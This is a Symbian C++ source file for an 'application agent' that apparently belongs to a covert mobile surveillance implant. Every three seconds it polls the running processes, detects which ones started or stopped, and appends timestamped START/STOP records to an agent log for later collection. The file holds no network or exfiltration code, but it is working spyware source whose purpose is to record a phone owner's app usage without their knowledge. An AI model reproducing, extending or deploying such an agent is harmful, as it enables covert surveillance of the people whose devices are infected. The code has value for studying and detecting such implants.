/*
 * AgentApplication.cpp
 *
 *  Created on: 24/set/2010
 *      Author: Giovanna
 */

#include "AgentApplication.h"
#include <HT\LogFile.h>

_LIT(KStart,"START");
_LIT(KStop,"STOP");

CAgentApplication::CAgentApplication() :
	CAbstractAgent(EAgent_Application),iSecondsInterv(3),iOldList(1,_FOFF(TProcItem,pUid)),iNewList(1,_FOFF(TProcItem,pUid))
	{
	// No implementation required
	}

CAgentApplication::~CAgentApplication()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	iOldList.Close();
	iNewList.Close();
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentApplication* CAgentApplication::NewLC(const TDesC8& params)
	{
	CAgentApplication* self = new (ELeave) CAgentApplication();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentApplication* CAgentApplication::NewL(const TDesC8& params)
	{
	CAgentApplication* self = CAgentApplication::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentApplication::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Application.txt");
	__FLOG(_L("-------------"));
		
	iTimer = CTimeOutTimer::NewL(*this);
	}

void CAgentApplication::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
		
	CreateLogL(LOGTYPE_APPLICATION);

	// reset process list
	iOldList.Reset();

	// retrieve first process list
	TProcItem procItem;
	TFullName res;
	TFindProcess proc;
	while(proc.Next(res) == KErrNone)
		{
		RProcess ph;
		TInt err = ph.Open(proc);
		if(err!=KErrNone)
			{
			continue;
		    }
		procItem.pUid = ph.Id().Id();
		procItem.name.Copy(ph.Name());
		iOldList.InsertInUnsignedKeyOrder(procItem);
		ph.Close();
		}
	
	TTime time;
	time.HomeTime();
	time += iSecondsInterv;        
	iTimer->At(time);
		
	}

void CAgentApplication::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
		
	iTimer->Cancel();
	CloseLogL();
	}

void CAgentApplication::TimerExpiredL(TAny* src)
	{
	/*
	RBuf8 buf(GetListBufferL());
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
		AppendLogL(buf);
		}
	CleanupStack::PopAndDestroy(&buf);
	*/
	
	HBufC8* tmp = GetListBufferL();
	if(tmp->Des().Length()>0)
		{
		AppendLogL(*tmp);
		}
	delete tmp;
	
	SwapLists();

	TTime time;
	time.HomeTime();
	time += iSecondsInterv;              
	iTimer->At(time);
			 
	}

void CAgentApplication::GetTimestamp(TTimestamp* aTimestamp)
	{
	TTime now;
	now.UniversalTime();
	TDateTime datetime;
	datetime = now.DateTime();
	
	aTimestamp->iSec = datetime.Second();
	aTimestamp->iMin = datetime.Minute();
	aTimestamp->iHour = datetime.Hour();
	aTimestamp->iMonthDay = datetime.Day() + 1; // day is numbered from 0
	aTimestamp->iMonth = datetime.Month()+1; // month is numbered from 0
	aTimestamp->iYear = datetime.Year(); 
	aTimestamp->iWeekDay = now.DayNoInWeek() + 1;  // this is locale dependent, pay attention
	aTimestamp->iYearDay = now.DayNoInYear() - 1; // in symbian the first day in year is number 1
	aTimestamp->iDaylightSav = 0;
	}

void CAgentApplication::SwapLists()
	{
	iOldList.Reset();
	TInt count = iNewList.Count();
	
	iOldList.Reserve(count);
	//Mem::Copy(&iOldList,&(iNewList[0]),sizeof(TProcItem)*count);
	for(TInt i = 0; i < count; i++)
		iOldList.Append(iNewList[i]);
	}

HBufC8* CAgentApplication::GetListBufferL(void)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);

	// get timestamp
	TTimestamp tstamp;
	GetTimestamp(&tstamp);
	
	// reset array
	iNewList.Reset();
	
	TUint16 null = 0;
	TUint32 delimiter = LOG_DELIMITER;
		
	// retrieve new process list and check if new proc have been started
	TProcItem procItem;
	TFullName res;
	TFindProcess proc;
	while(proc.Next(res) == KErrNone)
		{
		RProcess ph;
		TInt err = ph.Open(proc);
		if(err!=KErrNone)
			{
			continue;
			}
		procItem.pUid = ph.Id().Id();
		procItem.name.Copy(ph.Name());
		iNewList.InsertInUnsignedKeyOrder(procItem);
		if(iOldList.FindInUnsignedKeyOrder(procItem) == KErrNotFound)
			{
			// this is a new proc
			buffer->InsertL(buffer->Size(),&tstamp,sizeof(TTimestamp));
			buffer->InsertL(buffer->Size(),procItem.name.Ptr(),procItem.name.Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // null termination for name
			buffer->InsertL(buffer->Size(),KStart().Ptr(),KStart().Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));  // null termination for start
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // description set to null
			buffer->InsertL(buffer->Size(),(TUint8 *)&delimiter,sizeof(TUint32));
			}
		ph.Close();
		}

	// now let's search for stopped processes
	TInt count = iOldList.Count();
	for(TInt i=0; i< count; i++)
		{
		if(iNewList.FindInUnsignedKeyOrder(iOldList[i]) == KErrNotFound)
			{
			// proc has been stopped
			buffer->InsertL(buffer->Size(),&tstamp,sizeof(TTimestamp));
			buffer->InsertL(buffer->Size(),iOldList[i].name.Ptr(),iOldList[i].name.Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // null termination for name
			buffer->InsertL(buffer->Size(),KStop().Ptr(),KStop().Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // null termination for STOP
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // description set to null
			buffer->InsertL(buffer->Size(),(TUint8 *)&delimiter,sizeof(TUint32));
			}
		}
	
	HBufC8* result = buffer->Ptr(0).AllocL();
	
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}

